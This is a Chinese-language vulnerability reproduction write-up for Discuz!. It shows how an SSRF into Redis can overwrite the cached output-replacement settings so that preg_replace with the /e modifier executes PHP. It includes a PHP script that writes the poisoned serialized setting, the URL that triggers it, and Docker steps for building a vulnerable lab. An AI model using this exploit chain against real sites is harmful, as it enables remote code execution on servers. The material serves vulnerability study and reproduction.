# Discuz!利用SSRF+Redis缓存应用导致有条件代码执行
## 0x00漏洞简介
当dz设置使用缓存后，初始化时会把缓存内容加入全局变量$_G.而在调用缓存的地方source/fucntion/function_core.php中:
```
function output_replace($content) {
        ...
        if(...){
        ....
        $content = preg_replace($_G['setting']['output']['preg']['search'], $_G['setting']['output']['preg']['replace'],$content);
        }
        return $content;
}
```
其中，关键点的两个变量我们都可以通过redis修改:
```
$_G['setting']['output']['preg']['search']=”/.*/e”;
$_G['setting']['output']['preg']['replace']=”phpinfo();”;
```
dz使用redis时，全局变量$_G[‘setting’]放在xxxx_setting中的，其中前缀就是前面config_global.php中的prefix的值.也可以在redis-cli中通过如下命令查看：
```
keys *          #查看所有键
keys *_setting  #模糊查询的方式查找匹配的键
```
得到键名后通过以下方式修改本地缓存：
```
<?php
$a['output']['preg']['search']['plugins'] = "/.*/e";
$a['output']['preg']['replace']['plugins'] = "phpinfo();";
$a['rewritestatus']['plugins']=1;
$setting = serialize($a);
$redis = new Redis();
$redis->connect('127.0.0.1',6379);
$redis->set("kQbXlj_setting",$setting);
?>
```
复写缓存后访问如下地址就能发现成功getshell:
```
/discuz/forum.php?mod=ajax&inajax=yes&action=getthreadtype
```
## 0x01环境搭建
###获取镜像
环境搭建共使用三个镜像：MySQL、Redis和安装过phpredis的Discuz!  
其中MySQL和Redis的镜像可用以下命令从官方获取：
```
docker pull mysql
docker pull redis
```
鉴于国外源的镜像仓库速度缓慢且有时容易中断无响应，建立通过[DaoCloud](https://www.daocloud.io/)拉取镜像

[安装过phpredis的Discuz!下载地址](http://pan.baidu.com/s/1nvGm46d)

从discuz.tar.gz恢复出Discuz!镜像：

```
gzip -dc discuz.tar.gz | docker load
```
###运行镜像
```
docker run --name dz-mysql -e MYSQL_ROOT_PASSWORD=root -d mysql

docker run --name dz-redis -d redis

docker run --name dz-ssrf --link dz-mysql:mysql -p 8888:80 -d dz-redis-init apache2 "-DFOREGROUND"
```
访问127.0.0.1:8888进行Discuz!的安装

安装过后将config/config_global.php中redis的地址和端口改为redis容器的地址和端口（可用docker inspect dz-redis查看IP）

在后台中 全局 -> 性能优化 -> 内存优化 中查看redis是否被启用，若已启用则搭建完成。
